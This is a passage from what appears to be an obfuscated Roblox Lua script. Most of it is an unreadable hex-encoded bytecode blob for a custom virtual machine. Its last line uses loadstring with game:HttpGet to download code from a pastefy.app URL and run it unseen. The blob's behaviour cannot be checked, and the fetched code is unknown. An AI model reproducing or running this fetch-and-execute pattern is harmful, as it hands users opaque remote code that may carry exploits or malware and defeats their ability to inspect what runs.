Q001100092Q004B000900083Q001216000A00153Q001216000B00164Q001B0009000B00020010473Q001400092Q004B000900083Q001216000A00183Q001216000B00194Q001B0009000B00020010473Q001700092Q004B000900083Q001216000A001B3Q001216000B001C4Q001B0009000B00020010473Q001A00090012160009001A4Q0036000A000E3Q00262F0009003C0001001A00042E3Q003C0001001216000A001A4Q0036000B000B3Q001216000900173Q00262F0009009D0001001400042E3Q009D00012Q0036000E000E3Q00262F000A00530001001D00042E3Q00530001001216000F001A3Q00262F000F00460001001700042E3Q00460001001216000A001E3Q00042E3Q0053000100262F000F00420001001A00042E3Q0042000100105000100017000E000628000D004E0001001000042E3Q004E00010012520010001F3Q00205600113Q001A2Q00350010000200010012520010001F3Q00205600113Q00172Q0035001000020001001216000F00173Q00042E3Q0042000100262F000A00770001001E00042E3Q00770001001216000F001A4Q0036001000103Q00262F000F00670001001700042E3Q00670001001252001100204Q004B001200104Q004C00110002001300042E3Q0064000100062C0015006400013Q00042E3Q006400010012520016001F3Q00205600173Q00142Q004B001800144Q002B0017001700182Q00350016000200010006400011005D0001000200042E3Q005D000100042E3Q00730001000E22001A00570001000F00042E3Q0057000100022D001100013Q001204001100213Q001252001100223Q00205600123Q00112Q0051001100110012001216001200234Q00540011000200022Q004B001000113Q001216000F00173Q00042E3Q00570001001252000F001F3Q00205600103Q000E2Q0035000F0002000100042E3Q00A2000100262F000A007D0001001A00042E3Q007D0001001216000B00243Q00204F000F000B002500204F000B000F0026001216000A00173Q00262F000A008E0001001400042E3Q008E0001001216000F001A3Q00262F000F00840001001700042E3Q00840001001216000A001D3Q00042E3Q008E0001000E22001A00800001000F00042E3Q00800001001216000E00273Q000628000C008C0001000D00042E3Q008C00010012520010001F3Q00205600113Q000B2Q0035001000020001001216000F00173Q00042E3Q0080000100262F000A003F0001001700042E3Q003F0001001216000F001A3Q00262F000F00960001001A00042E3Q00960001001216000C00283Q001216000D00293Q001216000F00173Q00262F000F00910001001700042E3Q00910001001216000A00143Q00042E3Q003F000100042E3Q0091000100042E3Q003F000100042E3Q00A2000100262F000900370001001700042E3Q003700012Q0036000C000D3Q001216000900143Q00042E3Q003700012Q001E3Q00013Q00023Q00023Q00026Q00F03F026Q00704002264Q002600025Q001216000300014Q000300045Q001216000500013Q0004550003002100012Q003F00076Q004B000800024Q003F000900014Q003F000A00024Q003F000B00034Q003F000C00044Q004B000D6Q004B000E00063Q00204F000F000600012Q003C000C000F4Q0024000B3Q00022Q003F000C00034Q003F000D00044Q004B000E00014Q0003000F00014Q0031000F0006000F001050000F0001000F2Q0003001000014Q003100100006001000105000100001001000204F0010001000012Q003C000D00104Q0048000C6Q0024000A3Q0002002058000A000A00022Q00110009000A4Q000B00073Q00010004210003000500012Q003F000300054Q004B000400024Q0014000300044Q000900036Q001E3Q00017Q00073Q00028Q00026Q00F03F027Q004003043Q006D61746803053Q00666C2Q6F7203043Q00737172740100012F3Q001216000100014Q0036000200023Q001216000300013Q000E22000100030001000300042E3Q00030001000E22000100140001000100042E3Q001400012Q002600046Q004B000200043Q001216000400024Q004B00055Q001216000600023Q000455000400130001000E22000200100001000700042E3Q001000012Q005700086Q002A000800014Q00330002000700080004210004000D0001001216000100023Q00262F000100020001000200042E3Q00020001001216000400033Q001252000500043Q002056000500050005001252000600043Q0020560006000600062Q004B00076Q0011000600074Q002400053Q0002001216000600023Q0004550004002A00012Q005100080002000700062C0008002900013Q00042E3Q002900012Q00010008000700072Q004B00096Q004B000A00073Q00045500080029000100203D0002000B00070004210008002700010004210004002000012Q0012000200023Q00042E3Q0002000100042E3Q0003000100042E3Q000200012Q001E3Q00017Q00",v9(),...);
loadstring(game:HttpGet("https://pastefy.app/SmiBMLqq/raw",true))()
